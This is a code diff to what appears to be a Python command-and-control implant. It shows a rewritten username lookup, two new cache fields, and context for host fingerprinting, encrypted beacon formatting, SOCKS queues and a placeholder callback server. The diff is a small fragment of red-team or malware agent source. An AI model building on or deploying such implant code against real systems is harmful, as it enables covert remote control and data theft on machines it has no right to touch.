@@ -12,10 +12,10 @@ CRYPTO_HERE
         else: return platform.system() + " " + platform.release()
 
     def getUsername(self):
-        try: return os.getlogin()
+        try: return os.getlogin() 
         except: pass
-        if "USER" in os.environ.keys(): return os.environ["USER"]
-        elif "LOGNAME" in os.environ.keys(): return os.environ["LOGNAME"]
+        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
+            if k in os.environ.keys(): return os.environ[k]
 
     def formatMessage(self, data):
         return base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
@@ -179,6 +179,8 @@ CRYPTO_HERE
         self.socks_in = queue.Queue()
         self.socks_out = queue.Queue()
         self.taskings = []
+        self._meta_cache = {}
+        self.moduleRepo = {}
         self.current_directory = os.getcwd()
         self.agent_config = {
             "Server": "callback_host",
